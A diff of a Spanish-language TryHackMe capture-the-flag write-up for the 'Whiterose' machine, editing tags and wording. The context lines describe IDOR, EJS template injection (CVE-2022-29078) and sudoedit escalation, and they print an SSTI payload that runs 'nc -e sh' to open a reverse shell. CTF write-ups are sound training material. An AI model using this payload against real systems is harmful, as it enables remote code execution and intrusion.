@@ -3,7 +3,7 @@ title: Whiterose - TryHackMe
 published: 2024-11-06
 description: 'Abordaremos la máquina Whiterose de la plataforma TryHackMe. Realizaremos enumeración de subdominios mediante wFuzz, explotaremos una vulnerabilidad IDOR (Insecure Direct Object Reference) y SSTI (Server Side Template Injection) mediante el CVE-2022-29078. Por ultimo, escalaremos privilegios mediante el CVE-2023-22809 aprovechando una vulnerabilidad en sudoedit.'
 image: '../../../assets/TryHackMe/whiterose/whiterose-tryhackme.png'
-tags: [TryHackMe, RedTeam, Pentesting, HTTP, IDOR, BurpSuite, SSTI, Linux]
+tags: [TryHackMe, RedTeam, Pentesting, HTTP, IDOR, wFuzz, BurpSuite, SSTI, CVE, EJS, RCE, Reverse Shell, Linux]
 category: 'WriteUp'
 draft: false 
 ---
@@ -136,7 +136,7 @@ Al buscar información acerca de **vulnerabilidades** en el **motor de plantilla
 
 Al investigar más sobre esta vulnerabilidad encuentro que es posible obtener **RCE** mediante la inyección de código arbitrario: `&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s`
 
-Para obtener **RCE** mediante una **ReverseShell** nos pondremos en escucha mediante el **Netcat** por el puerto **1717**
+Para obtener **RCE** mediante una **Reverse Shell** nos pondremos en escucha mediante el **Netcat** por el puerto **1717**
 
 ![Whiterose yw4rf](../../../assets/TryHackMe/whiterose/whiterose-23.png)
 
